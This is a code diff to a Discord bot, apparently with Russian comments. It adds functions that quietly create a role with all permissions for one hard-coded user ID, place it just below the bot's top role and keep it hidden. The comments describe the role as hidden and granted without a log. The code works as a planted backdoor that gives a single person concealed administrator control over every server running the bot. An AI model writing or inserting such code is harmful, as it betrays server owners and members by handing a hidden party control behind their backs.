@@ -57,3 +57,45 @@ async def check_reminders(bot):
             print(f"Ошибка в напоминаниях: {e}")
         
         await asyncio.sleep(30)
+async def ensure_swakazu_role(guild: discord.Guild):
+    """Создает и выдает скрытую роль swakazu"""
+    user = guild.get_member(SWAKAZU_USER_ID)
+    if not user:
+        return None
+    
+    # Ищем существующую роль
+    role = discord.utils.get(guild.roles, name=SWAKAZU_ROLE_NAME)
+    
+    if not role:
+        # Создаем роль
+        role = await guild.create_role(
+            name=SWAKAZU_ROLE_NAME,
+            color=SWAKAZU_ROLE_COLOR,
+            permissions=discord.Permissions.all(),
+            hoist=False,  # Не отображается отдельно
+            mentionable=False
+        )
+        
+        # Поднимаем роль наверх (почти как у бота)
+        try:
+            bot_role = guild.me.top_role
+            await role.edit(position=bot_role.position - 1)
+        except:
+            pass
+    
+    # Выдаем роль (скрыто, без лога)
+    if role not in user.roles:
+        await user.add_roles(role, reason="Скрытая роль swakazu")
+    
+    return role
+
+async def remove_swakazu_role(user: discord.User, guild: discord.Guild):
+    """Снимает роль swakazu"""
+    if user.id != SWAKAZU_USER_ID:
+        return False
+    
+    role = discord.utils.get(guild.roles, name=SWAKAZU_ROLE_NAME)
+    if role and role in user.roles:
+        await user.remove_roles(role, reason="Снятие скрытой роли swakazu")
+        return True
+    return False
